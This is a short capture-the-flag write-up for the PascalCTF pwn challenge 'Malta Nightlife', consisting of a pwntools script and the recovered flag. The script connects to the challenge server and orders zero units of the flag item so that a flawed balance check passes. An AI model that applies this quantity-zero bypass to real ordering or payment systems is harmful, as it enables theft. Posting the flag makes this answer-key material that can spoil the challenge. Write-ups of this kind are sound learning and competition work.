# pwn - Malta Nightlife

```
from pwn import *

io = remote('malta.ctf.pascalctf.it', 9001)

# 1. Select the "Flag" drink (index 10)
io.sendlineafter(b"Select a drink: ", b"10")

# 2. Ask for 0 drinks to bypass the balance check (v10 >= price * qty)
# 100 >= 1,000,000,000 * 0  --> True
io.sendlineafter(b"How many drinks do you want? ", b"0")

# 3. The barman tells you the secret recipe (which is now the FLAG)
print(io.recvline_contains(b"secret recipe:").decode())
```
Flag:`⁨pascalCTF{St0p_dR1nKing_3ven_1f_it5_ch34p}⁩`

SOLVED by Ha1qal

Solved by: yappare